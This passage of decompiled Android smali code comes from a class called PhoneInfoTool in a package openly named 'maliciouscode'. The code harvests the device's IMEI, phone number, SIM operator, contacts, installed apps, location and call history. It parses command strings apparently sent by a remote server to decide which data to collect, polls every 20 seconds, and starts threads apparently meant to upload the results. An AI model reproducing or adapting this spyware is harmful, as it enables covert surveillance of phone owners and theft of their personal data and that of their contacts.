    invoke-virtual {v1, v10, v11}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, ","

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v6, v7}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    return-object v1
.end method

.method public static getLocation(Landroid/content/Context;)V
    .locals 3
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 110
    invoke-static {p0}, Lcom/lu/maliciouscode/PhoneInfoTool;->getLngAndLat(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ","

    invoke-virtual {v1, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 111
    .local v0, "s":[Ljava/lang/String;
    sget-object v1, Lcom/lu/maliciouscode/PhoneInfoTool;->phoneInfo:Lcom/lu/maliciouscode/PhoneInfo;

    const/4 v2, 0x1

    aget-object v2, v0, v2

    invoke-virtual {v1, v2}, Lcom/lu/maliciouscode/PhoneInfo;->setLatitude(Ljava/lang/String;)V

    .line 112
    sget-object v1, Lcom/lu/maliciouscode/PhoneInfoTool;->phoneInfo:Lcom/lu/maliciouscode/PhoneInfo;

    const/4 v2, 0x0

    aget-object v2, v0, v2

    invoke-virtual {v1, v2}, Lcom/lu/maliciouscode/PhoneInfo;->setLongitude(Ljava/lang/String;)V

    .line 113
    return-void
.end method

.method public static getPhoneAppList(Landroid/content/Context;)V
    .locals 6
    .param p0, "c"    # Landroid/content/Context;

    .prologue
    .line 51
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    .line 52
    .local v2, "pm":Landroid/content/pm/PackageManager;
    const/4 v3, 0x0

    invoke-virtual {v2, v3}, Landroid/content/pm/PackageManager;->getInstalledPackages(I)Ljava/util/List;

    move-result-object v1

    .line 53
    .local v1, "packages":Ljava/util/List;, "Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v4

    :cond_0
    :goto_0
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-eqz v3, :cond_1

    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/content/pm/PackageInfo;

    .line 54
    .local v0, "packageInfo":Landroid/content/pm/PackageInfo;
    iget-object v3, v0, Landroid/content/pm/PackageInfo;->applicationInfo:Landroid/content/pm/ApplicationInfo;

    iget v3, v3, Landroid/content/pm/ApplicationInfo;->flags:I

    and-int/lit8 v3, v3, 0x1

    if-nez v3, :cond_0

    .line 55
    sget-object v5, Lcom/lu/maliciouscode/PhoneInfoTool;->appList:Ljava/util/List;

    iget-object v3, v0, Landroid/content/pm/PackageInfo;->applicationInfo:Landroid/content/pm/ApplicationInfo;

    invoke-virtual {v3, v2}, Landroid/content/pm/ApplicationInfo;->loadLabel(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;

    move-result-object v3

    check-cast v3, Ljava/lang/String;

    invoke-interface {v5, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto :goto_0

    .line 58
    .end local v0    # "packageInfo":Landroid/content/pm/PackageInfo;
    :cond_1
    sget-object v3, Lcom/lu/maliciouscode/PhoneInfoTool;->phoneInfo:Lcom/lu/maliciouscode/PhoneInfo;

    sget-object v4, Lcom/lu/maliciouscode/PhoneInfoTool;->appList:Ljava/util/List;

    invoke-virtual {v3, v4}, Lcom/lu/maliciouscode/PhoneInfo;->setPhoneAppInstalled(Ljava/util/List;)V

    .line 59
    return-void
.end method

.method public static getPhoneInfo(Landroid/content/Context;)V
    .locals 3
    .param p0, "c"    # Landroid/content/Context;

    .prologue
    .line 95
    const-string v1, "phone"

    invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    .line 96
    .local v0, "tm":Landroid/telephony/TelephonyManager;
    sget-object v1, Lcom/lu/maliciouscode/PhoneInfoTool;->phoneInfo:Lcom/lu/maliciouscode/PhoneInfo;

    sget-object v2, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    invoke-virtual {v1, v2}, Lcom/lu/maliciouscode/PhoneInfo;->setPhoneFactory(Ljava/lang/String;)V

    .line 97
    sget-object v1, Lcom/lu/maliciouscode/PhoneInfoTool;->phoneInfo:Lcom/lu/maliciouscode/PhoneInfo;

    sget-object v2, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v1, v2}, Lcom/lu/maliciouscode/PhoneInfo;->setPhoneModel(Ljava/lang/String;)V

    .line 98
    sget-object v1, Lcom/lu/maliciouscode/PhoneInfoTool;->phoneInfo:Lcom/lu/maliciouscode/PhoneInfo;

    sget-object v2, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-virtual {v1, v2}, Lcom/lu/maliciouscode/PhoneInfo;->setPhoneVersion(Ljava/lang/String;)V

    .line 99
    sget-object v1, Lcom/lu/maliciouscode/PhoneInfoTool;->phoneInfo:Lcom/lu/maliciouscode/PhoneInfo;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Lcom/lu/maliciouscode/PhoneInfo;->setPhoneIMEI(Ljava/lang/String;)V

    .line 100
    sget-object v1, Lcom/lu/maliciouscode/PhoneInfoTool;->phoneInfo:Lcom/lu/maliciouscode/PhoneInfo;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Lcom/lu/maliciouscode/PhoneInfo;->setPhoneNumber(Ljava/lang/String;)V

    .line 101
    sget-object v1, Lcom/lu/maliciouscode/PhoneInfoTool;->phoneInfo:Lcom/lu/maliciouscode/PhoneInfo;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getSimOperatorName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Lcom/lu/maliciouscode/PhoneInfo;->setPhoneSimOperator(Ljava/lang/String;)V

    .line 102
    const-string v1, "log1"

    const-string v2, "in getPhoneInfo"

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 103
    return-void
.end method

.method public static getPhoneNumberList(Landroid/content/Context;)V
    .locals 12
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    const/4 v2, 0x0

    .line 67
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    .line 69
    .local v0, "cr":Landroid/content/ContentResolver;
    sget-object v1, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;

    move-object v3, v2

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v7

    .line 70
    .local v7, "cursor":Landroid/database/Cursor;
    :goto_0
    invoke-interface {v7}, Landroid/database/Cursor;->moveToNext()Z

    move-result v1

    if-eqz v1, :cond_1

    .line 72
    const-string v1, "display_name"

    invoke-interface {v7, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v9

    .line 73
    .local v9, "nameFieldColumnIndex":I
    invoke-interface {v7, v9}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    .line 75
    .local v8, "name":Ljava/lang/String;
    const-string v1, "_id"

    invoke-interface {v7, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v7, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    .line 76
    .local v6, "contactId":Ljava/lang/String;
    sget-object v1, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "contact_id = "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v10

    .line 79
    .local v10, "phone":Landroid/database/Cursor;
    :goto_1
    invoke-interface {v10}, Landroid/database/Cursor;->moveToNext()Z

    move-result v1

    if-eqz v1, :cond_0

    .line 80
    const-string v1, "data1"

    invoke-interface {v10, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v10, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v11

    .line 81
    .local v11, "strPhoneNumber":Ljava/lang/String;
    sget-object v1, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, ":"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    .line 82
    sget-object v1, Lcom/lu/maliciouscode/PhoneInfoTool;->usercontact:Ljava/util/List;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, ":"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v1, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto :goto_1

    .line 84
    .end local v11    # "strPhoneNumber":Ljava/lang/String;
    :cond_0
    invoke-interface {v10}, Landroid/database/Cursor;->close()V

    goto/16 :goto_0

    .line 86
    .end local v6    # "contactId":Ljava/lang/String;
    .end local v8    # "name":Ljava/lang/String;
    .end local v9    # "nameFieldColumnIndex":I
    .end local v10    # "phone":Landroid/database/Cursor;
    :cond_1
    invoke-interface {v7}, Landroid/database/Cursor;->close()V

    .line 87
    sget-object v1, Lcom/lu/maliciouscode/PhoneInfoTool;->phoneInfo:Lcom/lu/maliciouscode/PhoneInfo;

    sget-object v2, Lcom/lu/maliciouscode/PhoneInfoTool;->usercontact:Ljava/util/List;

    invoke-virtual {v1, v2}, Lcom/lu/maliciouscode/PhoneInfo;->setPhoneContacter(Ljava/util/List;)V

    .line 88
    return-void
.end method

.method public static init(Landroid/content/Context;)V
    .locals 3
    .param p0, "c"    # Landroid/content/Context;

    .prologue
    .line 296
    sput-object p0, Lcom/lu/maliciouscode/PhoneInfoTool;->context:Landroid/content/Context;

    .line 297
    invoke-static {p0}, Lcom/lu/maliciouscode/PhoneInfoTool;->getPhoneInfo(Landroid/content/Context;)V

    .line 298
    invoke-static {p0}, Lcom/lu/maliciouscode/PhoneInfoTool;->getPhoneNumberList(Landroid/content/Context;)V

    .line 299
    invoke-static {p0}, Lcom/lu/maliciouscode/PhoneInfoTool;->getPhoneAppList(Landroid/content/Context;)V

    .line 300
    invoke-static {p0}, Lcom/lu/maliciouscode/PhoneInfoTool;->getLocation(Landroid/content/Context;)V

    .line 301
    const/16 v1, 0xa

    invoke-static {v1, p0}, Lcom/lu/maliciouscode/PhoneInfoTool;->getCallHistoryList(ILandroid/content/Context;)V

    .line 302
    new-instance v1, Ljava/lang/Thread;

    sget-object v2, Lcom/lu/maliciouscode/PhoneInfoTool;->NetThread:Ljava/lang/Runnable;

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    .line 303
    new-instance v0, Lcom/lu/maliciouscode/PhoneInfoTool$1;

    invoke-direct {v0}, Lcom/lu/maliciouscode/PhoneInfoTool$1;-><init>()V

    .line 309
    .local v0, "runnable":Ljava/lang/Runnable;
    new-instance v1, Ljava/lang/Thread;

    invoke-direct {v1, v0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    .line 310
    return-void
.end method

.method public static parseNetCode(Landroid/content/Context;Ljava/lang/String;)V
    .locals 3
    .param p0, "c"    # Landroid/content/Context;
    .param p1, "code"    # Ljava/lang/String;

    .prologue
    .line 346
    const-string v1, "in parseNetCode"

    invoke-static {v1, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 347
    const-string v1, "11111"

    invoke-virtual {p1, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    .line 348
    invoke-static {p0}, Lcom/lu/maliciouscode/PhoneInfoTool;->init(Landroid/content/Context;)V

    .line 358
    :cond_0
    return-void

    .line 349
    :cond_1
    const-string v1, "00000"

    invoke-virtual {p1, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    .line 352
    const/4 v0, 0x0

    .local v0, "i":I
    :goto_0
    const/4 v1, 0x5

    if-ge v0, v1, :cond_0

    .line 353
    invoke-virtual {p1, v0}, Ljava/lang/String;->charAt(I)C

    move-result v1

    const/16 v2, 0x31

    if-ne v1, v2, :cond_2

    .line 354
    add-int/lit8 v1, v0, 0x1

    invoke-static {p0, v1}, Lcom/lu/maliciouscode/PhoneInfoTool;->upData(Landroid/content/Context;I)V

    .line 352
    :cond_2
    add-int/lit8 v0, v0, 0x1

    goto :goto_0
.end method

.method public static startRequest()V
    .locals 4

    .prologue
    .line 362
    .local v0, "e":Ljava/lang/InterruptedException;
    :goto_0
    const-wide/16 v2, 0x4e20

    :try_start_0
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    .line 366
    :goto_1
    const-string v1, "20s "

    const-string v2, "......................................."

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 367
    new-instance v1, Ljava/lang/Thread;

    sget-object v2, Lcom/lu/maliciouscode/PhoneInfoTool;->ReuestThread:Ljava/lang/Runnable;

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    goto :goto_0

    .line 363
    :catch_0
    move-exception v0

    .line 364
    invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto :goto_1
.end method

.method public static upData(Landroid/content/Context;I)V
    .locals 2
    .param p0, "c"    # Landroid/content/Context;
    .param p1, "flag"    # I

    .prologue
    .line 319
    invoke-static {p0}, Lcom/lu/maliciouscode/PhoneInfoTool;->getPhoneInfo(Landroid/content/Context;)V

    .line 320
    sget-object v0, Lcom/lu/maliciouscode/PhoneInfoTool;->phoneInfo:Lcom/lu/maliciouscode/PhoneInfo;

    invoke-virtual {v0}, Lcom/lu/maliciouscode/PhoneInfo;->getPhoneIMEI()Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_0

    .line 321
    sget-object v0, Lcom/lu/maliciouscode/PhoneInfoTool;->phoneInfo:Lcom/lu/maliciouscode/PhoneInfo;

    const-string v1, "08143381"

    invoke-virtual {v0, v1}, Lcom/lu/maliciouscode/PhoneInfo;->setPhoneIMEI(Ljava/lang/String;)V

    .line 323
    :cond_0
    const/4 v0, 0x1

    if-ne p1, v0, :cond_2

    .line 325
    invoke-static {p0}, Lcom/lu/maliciouscode/PhoneInfoTool;->getPhoneNumberList(Landroid/content/Context;)V

    .line 326
    new-instance v0, Ljava/lang/Thread;

    sget-object v1, Lcom/lu/maliciouscode/PhoneInfoTool;->ContactsThread:Ljava/lang/Runnable;

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 343
    :cond_1
    :goto_0
    return-void

    .line 327
    :cond_2
    const/4 v0, 0x2

    if-ne p1, v0, :cond_3

    .line 329
    new-instance v0, Ljava/lang/Thread;

    sget-object v1, Lcom/lu/maliciouscode/PhoneInfoTool;->DeviceThread:Ljava/lang/Runnable;

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    goto :goto_0

    .line 330
    :cond_3
    const/4 v0, 0x3

    if-ne p1, v0, :cond_4

    .line 332
    invoke-static {p0}, Lcom/lu/maliciouscode/PhoneInfoTool;->getPhoneAppList(Landroid/content/Context;)V

    .line 333
    new-instance v0, Ljava/lang/Thread;

    sget-object v1, Lcom/lu/maliciouscode/PhoneInfoTool;->AppInstalledThread:Ljava/lang/Runnable;

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    goto :goto_0

    .line 334
    :cond_4
    const/4 v0, 0x4

    if-ne p1, v0, :cond_5

    .line 336
    invoke-static {p0}, Lcom/lu/maliciouscode/PhoneInfoTool;->getLocation(Landroid/content/Context;)V

    .line 337
    new-instance v0, Ljava/lang/Thread;

    sget-object v1, Lcom/lu/maliciouscode/PhoneInfoTool;->locationThread:Ljava/lang/Runnable;

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    goto :goto_0

    .line 338
    :cond_5
    const/4 v0, 0x5

    if-ne p1, v0, :cond_1

    .line 340
    const/16 v0, 0x14

    invoke-static {v0, p0}, Lcom/lu/maliciouscode/PhoneInfoTool;->getCallHistoryList(ILandroid/content/Context;)V

    .line 341
    new-instance v0, Ljava/lang/Thread;

    sget-object v1, Lcom/lu/maliciouscode/PhoneInfoTool;->CallLogThread:Ljava/lang/Runnable;

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    goto :goto_0
.end method
